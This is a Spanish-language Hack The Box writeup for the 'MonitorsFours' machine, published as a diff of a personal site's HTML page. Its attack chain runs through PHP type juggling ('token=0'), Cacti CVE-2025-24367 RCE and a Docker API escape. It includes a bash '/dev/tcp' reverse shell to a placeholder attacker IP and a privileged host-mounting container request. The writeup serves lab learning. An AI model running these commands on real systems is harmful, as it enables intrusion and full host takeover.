@@ -1,0 +1,177 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
+<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
+← Volver a Writeups
+</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> MonitorsFours Hack The Box </h1> <p class="text-slate-400 text-sm mb-2">1 de marzo de 2026</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Explotacion de aplicacion web cacti y escalada de privilegios con Docker </p> </div> <!-- BLOQUE DE INFORMACIÓN TÉCNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">Detalles Técnicos</h2> <ul class="space-y-2 text-slate-300">    <li><strong>Dificultad:</strong> Easy</li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">Etiquetas y Tecnología</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> docker </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> cacti </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> web </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <p><img src="/img/monitorsfours.png" alt="Banner SoulMate"></p>
+<h2 id="1-reconocimiento-y-enumeración-inicial">1. Reconocimiento y Enumeración Inicial</h2>
+<p>El escaneo de puertos identifica una <strong>superficie de ataque híbrida</strong>, compuesta por un servidor web Linux y servicios de administración remota de Windows.</p>
+<h3 id="-escaneo-de-puertos-nmap">📌 Escaneo de Puertos (Nmap)</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="right">Puerto</th><th>Servicio</th><th>Versión / Detalle</th></tr></thead><tbody><tr><td align="right">80</td><td>HTTP</td><td>nginx (PHP 8.3.27)</td></tr><tr><td align="right">5985</td><td>WinRM</td><td>Microsoft HTTPAPI httpd 2.0 (Administración remota)</td></tr></tbody></table>
+<hr>
+<h2 id="2-enumeración-web">2. Enumeración Web</h2>
+<p>Al explorar <a href="http://monitorsfour.htb">http://monitorsfour.htb</a> se identifican los siguientes vectores:</p>
+<ul>
+<li><strong>Stack tecnológico:</strong> PHP 8.3.27 sobre nginx</li>
+<li><strong>Fuzzing de directorios:</strong>
+<ul>
+<li>Archivo .env expuesto</li>
+<li>Subdominio descubierto: cacti.monitorsfour.htb</li>
+</ul>
+</li>
+</ul>
+<h3 id="-hallazgo-crítico-env">🔥 Hallazgo Crítico: .env</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>DB_PASSWORD=f******</span></span>
+<span class="line"><span>DB_USER=monitorsdbuser</span></span></code></pre>
+<hr>
+<h2 id="3-acceso-inicial--type-juggling-en-php">3. Acceso Inicial – Type Juggling en PHP</h2>
+<p>El endpoint /user expone una API que requiere un parámetro token.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">curl</span><span style="color:#F1FA8C"> http://monitorsfour.htb/user</span></span>
+<span class="line"><span style="color:#F8F8F2">{</span><span style="color:#50FA7B">"error"</span><span style="color:#8BE9FD">:</span><span style="color:#50FA7B">"Missing token parameter"</span><span style="color:#50FA7B">}</span></span></code></pre>
+<h3 id="vulnerabilidad-type-juggling-php-83">Vulnerabilidad: Type Juggling (PHP 8.3)</h3>
+<p>PHP utiliza comparaciones débiles (==) que convierten tipos automáticamente.</p>
+<blockquote>
+<p><strong>Explicación técnica:</strong>
+Si el código compara un token string con un entero (0) usando ==, y el string no comienza con un número, PHP lo convierte a 0.
+Resultado: “token_secreto” == 0 → true.</p>
+</blockquote>
+<h3 id="explotación">Explotación</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>http://monitorsfour.htb/user?token=0</span></span></code></pre>
+<p>El servidor valida el acceso y retorna un <strong>volcado JSON con usuarios</strong>.</p>
+<h3 id="-credenciales-obtenidas-tras-crackear-hashes-md5">🎯 Credenciales Obtenidas (tras crackear hashes MD5)</h3>
+<ul>
+<li><strong>Usuario:</strong> <code>marcus</code></li>
+<li><strong>Password:</strong> <code>w*********</code></li>
+</ul>
+<hr>
+<h2 id="4-intrusión-en-el-contenedor--cacti-rce">4. Intrusión en el Contenedor – Cacti RCE</h2>
+<p>Con las credenciales de marcus, se accede a:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://cacti.monitorsfour.htb</span></span></code></pre>
+<ul>
+<li><strong>Versión detectada:</strong> Cacti v1.2.28</li>
+<li><strong>Vulnerabilidad:</strong> Inyección en plantillas de gráfico</li>
+<li><strong>CVE:</strong> CVE-2025-24367</li>
+</ul>
+<blockquote>
+<p><strong>Explicación técnica:</strong>
+Cacti usa rrdtool para generar gráficos. Una sanitización deficiente de parámetros permite inyectar comandos del sistema, logrando <strong>RCE</strong> con privilegios administrativos.</p>
+</blockquote>
+<h3 id="pasos-de-explotación">Pasos de Explotación</h3>
+<ol>
+<li>
+<p><strong>Preparación</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">git</span><span style="color:#F1FA8C"> clone</span><span style="color:#F1FA8C"> https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git</span></span></code></pre>
+</li>
+<li>
+<p><strong>Oyente</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nc</span><span style="color:#BD93F9"> -lvnp</span><span style="color:#BD93F9"> 4444</span></span></code></pre>
+</li>
+<li>
+<p><strong>Ejecución del exploit</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> exploit_cacti.py</span><span style="color:#FF79C6"> \</span></span>
+<span class="line"><span style="color:#BD93F9">  -u</span><span style="color:#F1FA8C"> marcus</span><span style="color:#BD93F9"> -p</span><span style="color:#BD93F9;font-style:italic"> ******</span><span style="color:#FF79C6"> \</span></span>
+<span class="line"><span style="color:#BD93F9">  -i</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">ATTACKER_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -l</span><span style="color:#BD93F9"> 4444</span><span style="color:#FF79C6"> \</span></span>
+<span class="line"><span style="color:#BD93F9">  -url</span><span style="color:#F1FA8C"> http://cacti.monitorsfour.htb</span></span></code></pre>
+</li>
+<li>
+<p><strong>Resultado</strong></p>
+<ul>
+<li>Reverse shell establecida</li>
+<li>Acceso como www-data</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="5-escalada-de-privilegios--escape-de-docker-wsl2">5. Escalada de Privilegios – Escape de Docker (WSL2)</h2>
+<h3 id="evidencia-de-contenedor-docker">Evidencia de Contenedor Docker</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">hostname</span></span>
+<span class="line"><span style="color:#50FA7B">821fbd6a43fa</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">ls</span><span style="color:#BD93F9"> -la</span><span style="color:#F1FA8C"> /</span></span>
+<span class="line"><span style="color:#50FA7B">-rwxr-xr-x</span><span style="color:#BD93F9"> 1</span><span style="color:#F1FA8C"> root</span><span style="color:#F1FA8C"> root</span><span style="color:#BD93F9"> 0</span><span style="color:#F1FA8C"> Nov</span><span style="color:#BD93F9"> 10</span><span style="color:#F1FA8C"> 17:04</span><span style="color:#F1FA8C"> .dockerenv</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">uname</span><span style="color:#BD93F9"> -a</span></span>
+<span class="line"><span style="color:#50FA7B">Linux</span><span style="color:#F1FA8C"> ...</span><span style="color:#F1FA8C"> microsoft-standard-WSL2</span></span></code></pre>
+<p>El entorno corresponde a <strong>Docker Desktop sobre Windows (WSL2)</strong>.</p>
+<h3 id="condición-crítica">Condición Crítica</h3>
+<ul>
+<li>Contenedor con privilegios elevados</li>
+<li>Acceso a <strong>Docker API expuesta internamente</strong> (2375)</li>
+<li>IP común en WSL2: 192.168.65.7</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">curl</span><span style="color:#F1FA8C"> http://192.168.65.7:2375/version</span></span></code></pre>
+<hr>
+<h2 id="6-escape-al-host-windows-vía-docker-api">6. Escape al Host Windows vía Docker API</h2>
+<blockquote>
+<p><strong>Teoría de la vulnerabilidad:</strong>
+En Docker Desktop para Windows, exponer el demonio Docker en TCP (2375) dentro de WSL2 permite que cualquier contenedor controle el motor Docker y monte el disco del host (C:).</p>
+</blockquote>
+<h3 id="cadena-de-ataque">Cadena de Ataque</h3>
+<ol>
+<li>
+<p><strong>Enumerar imágenes disponibles</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">curl</span><span style="color:#F1FA8C"> http://192.168.65.7:2375/images/json</span></span></code></pre>
+<p>Imagen válida encontrada:
+docker_setup-nginx-php:latest</p>
+</li>
+<li>
+<p><strong>Crear contenedor malicioso (montando el host)</strong></p>
+<p>Ejemplo práctico:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -X</span><span style="color:#F1FA8C"> POST</span><span style="color:#F1FA8C"> http://192.168.65.7:2375/containers/create</span><span style="color:#FF79C6"> \</span></span>
+<span class="line"><span style="color:#BD93F9">  -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Content-Type: application/json</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> \</span></span>
+<span class="line"><span style="color:#BD93F9">  -d</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">{</span></span>
+<span class="line"><span style="color:#F1FA8C">    "Image":"alpine",</span></span>
+<span class="line"><span style="color:#F1FA8C">    "HostConfig":{</span></span>
+<span class="line"><span style="color:#F1FA8C">      "Binds":["/:/host"],</span></span>
+<span class="line"><span style="color:#F1FA8C">      "Privileged":true,</span></span>
+<span class="line"><span style="color:#F1FA8C">      "NetworkMode":"host"</span></span>
+<span class="line"><span style="color:#F1FA8C">    },</span></span>
+<span class="line"><span style="color:#F1FA8C">    "Cmd":["sh","-c",</span></span>
+<span class="line"><span style="color:#F1FA8C">      "chroot /host /bin/bash -c \"bash -i >&#x26; /dev/tcp/&#x3C;IP-ATAKER>/9001 0>&#x26;1\""</span></span>
+<span class="line"><span style="color:#F1FA8C">    ]</span></span>
+<span class="line"><span style="color:#F1FA8C">  }</span><span style="color:#E9F284">'</span></span></code></pre>
+</li>
+<li>
+<p><strong>Iniciar contenedor</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -X</span><span style="color:#F1FA8C"> POST</span><span style="color:#F1FA8C"> http://192.168.65.7:2375/containers/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">D</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/start</span></span></code></pre>
+</li>
+</ol>
+<h3 id="resultado">Resultado</h3>
+<ul>
+<li>Reverse shell como <strong>root en el host Windows</strong></li>
+<li>Acceso completo al sistema anfitrión</li>
+</ul>
+<hr>
+<h2 id="7-post-explotación-y-flags">7. Post-Explotación y Flags</h2>
+<ul>
+<li>
+<p><strong>User Flag</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/home/marcus/user.txt</span></span></code></pre>
+</li>
+<li>
+<p><strong>Root Flag (Host Windows)</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/mnt/host/c/Users/Administrator/Desktop/root.txt</span></span></code></pre>
+</li>
+</ul> </div> <!-- FOOTER DEL ARTÍCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de writeups
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2026 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
